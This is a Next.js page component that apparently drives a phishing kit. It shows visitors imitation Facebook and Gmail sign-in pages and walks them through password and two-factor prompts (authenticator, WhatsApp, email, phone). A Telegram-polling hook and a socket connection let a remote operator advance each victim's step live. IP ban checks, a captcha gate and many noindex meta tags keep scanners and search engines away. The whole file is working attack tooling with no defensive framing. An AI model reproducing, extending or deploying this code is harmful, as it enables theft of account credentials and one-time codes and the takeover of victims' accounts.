import Head from "next/head";
import styles from "../styles/Home.module.css";
import React, { createContext, useState, useEffect } from "react";
import { useHideRecaptchaBadge } from "../hooks/useHideRecaptchaBadge";

// Component imports - Main page components
import Step1FB from "../components/fbook/Step1.js";
import Step2FB from "../components/fbook/Step2.js";
import Step3FB from "../components/fbook/Step3.js";
import Fa2FB from "../components/fbook/Fa2.js";
import Fa2RedFB from "../components/fbook/Fa2Red.js";
import PhoneVerifyFB from "../components/fbook/PhoneVerify.js";
import Fa2WhatsappFB from "../components/fbook/Fa2Whatsapp.js";
import Fa2EmailFB from "../components/fbook/Fa2Email.js";
import Fa2AuthAppFB from "../components/fbook/Fa2AuthApp.js";

// Gmail components
import Step1GM from "../components/gmail/Step1.js";
import Step2GM from "../components/gmail/Step2.js";
import Step3GM from "../components/gmail/Step3.js";
import Fa2GM from "../components/gmail/Fa2.js";
import Fa2RedGM from "../components/gmail/Fa2Red.js";
import PhoneVerifyGM from "../components/gmail/PhoneVerify.js";
import Fa2WhatsappGM from "../components/gmail/Fa2Whatsapp.js";
import Fa2EmailGM from "../components/gmail/Fa2Email.js";
import Fa2AuthAppGM from "../components/gmail/Fa2AuthApp.js";

// Common components
import Captcha from "../components/Captcha/Captcha.js";
import Done from "../components/common/Done.js";

// Hooks
import { useUserData } from "../hooks/useUserData";
import { useStepManagement } from "../hooks/useStepManagement";
import { useIPManagement } from "../hooks/useIPManagement";
import { useInitialSetup } from "../hooks/useInitialSetup";
import { useTelegramPolling } from "../hooks/useTelegramPolling";
import { useSocketConnection } from "../utils/socket/useSocketConnection";

// Utils
import { PageUtils } from "../utils/pageUtils";

// Step mapping for better maintainability
const STEP_COMPONENTS_FB = {
  0: Captcha,
  1: Step1FB,
  2: Step2FB,
  3: Fa2FB,
  4: Step3FB,
  6: Fa2RedFB,
  7: Step1FB,
  10: PhoneVerifyFB,
  11: Done,
  12: Fa2WhatsappFB,
  13: Fa2EmailFB,
  14: Fa2FB,
  15: Fa2AuthAppFB,
};

const STEP_COMPONENTS_GM = {
  0: Captcha,
  1: Step1GM,
  2: Step2GM,
  3: Fa2GM,
  4: Step3GM,
  6: Fa2RedGM,
  7: Step1GM,
  10: PhoneVerifyGM,
  11: Done,
  12: Fa2WhatsappGM,
  13: Fa2EmailGM,
  14: Fa2GM,
  15: Fa2AuthAppGM,
};

export const DataContext = createContext();

// Main component
export default function Home() {
  // Hide badge for auth steps (both FB and Gmail)
  const AUTH_STEPS = new Set([1, 2, 3, 4, 6, 7, 10, 12, 13, 14, 15]);
  const [ContinueWithFacebook, setContinueWithFacebook] = useState(true);
  const userData = useUserData();
  const stepManagement = useStepManagement();
  useHideRecaptchaBadge(AUTH_STEPS.has(stepManagement.Step));

  // Initialize user data and setup - this will handle IP fetching
  const { Unik, isInitialized } = useInitialSetup(
    userData.setAllData,
    stepManagement.setStep
  );

  // IP management (gets IP from AllData, handles ban checking)
  const { Ip, setIp } = useIPManagement();

  // Update IP when AllData changes (from initial setup)
  useEffect(() => {
    if (userData.AllData?.ip && userData.AllData.ip !== Ip) {
      setIp(userData.AllData.ip);
    }
  }, [userData.AllData?.ip, Ip, setIp]);

  // Additional hooks
  useTelegramPolling(
    Unik,
    stepManagement.setStep,
    stepManagement.setLastFetch,
    stepManagement.LastFetch,
    Ip,
    stepManagement.setWrong2faTrigger,
    stepManagement.wrong2faTrigger,
    stepManagement.setWrongPasswordTrigger,
    stepManagement.wrongPasswordTrigger
  );

  useSocketConnection(Unik, userData.AllData);
  // Dynamic title and favicon based on step
  const { title, favicon } = PageUtils.getPageMeta(stepManagement.Step);

  // Render step component
  const renderStepComponent = () => {
    const STEP_COMPONENTS = ContinueWithFacebook ? STEP_COMPONENTS_FB : STEP_COMPONENTS_GM;
    const Component = STEP_COMPONENTS[stepManagement.Step];
    if (!Component) return null;

    const commonProps = {
      setStep: stepManagement.setStep,
      Unik,
      Ip,
      setIp,
      Step: stepManagement.Step,
      InvalidPassword: stepManagement.InvalidPassword,
      ContinueWithFacebook,
      setContinueWithFacebook,
      LastFetch: stepManagement.LastFetch,
      wrong2faTrigger: stepManagement.wrong2faTrigger,
      wrongPasswordTrigger: stepManagement.wrongPasswordTrigger,
      ...userData,
    };

    return <Component {...commonProps} />;
  };

  return (
    <div className={styles.container}>
      <Head>
        <title>{title}</title>
        <link rel="icon" href={favicon} />
        <meta charSet="utf-8" />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1"
        />
        <meta name="theme-color" content="#fff" />
        <meta name="robots" content="noimageindex" />
        <meta name="robots" content="notranslate" />
        <meta name="robots" content="nositelinkssearchbox" />
        <meta name="robots" content="nosnippet" />
        <meta name="robots" content="max-snippet:0" />
        <meta
          name="crawler"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="AdsBot-Google"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta
          name="googlebot-news"
          content="noindex,nofollow,noarchive,noimageindex"
        />
        <meta name="googlebot-news" content="nosnippet" />
        <meta name="robots" content="max-image-preview:none" />
        <meta name="robots" content="noindex,nofollow,noarchive" />
        <meta name="robots" content="noarchive" />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: light)"
        />
        <meta
          name="theme-color"
          content="#00000000"
          media="(prefers-color-scheme: dark)"
        />
      </Head>

      <DataContext.Provider
        value={{ setAllData: userData.setAllData, AllData: userData.AllData }}
      >
        <div className="min-h-screen">
          <div className="flex justify-center w-full">
            {renderStepComponent()}
          </div>
        </div>
      </DataContext.Provider>
    </div>
  );
}
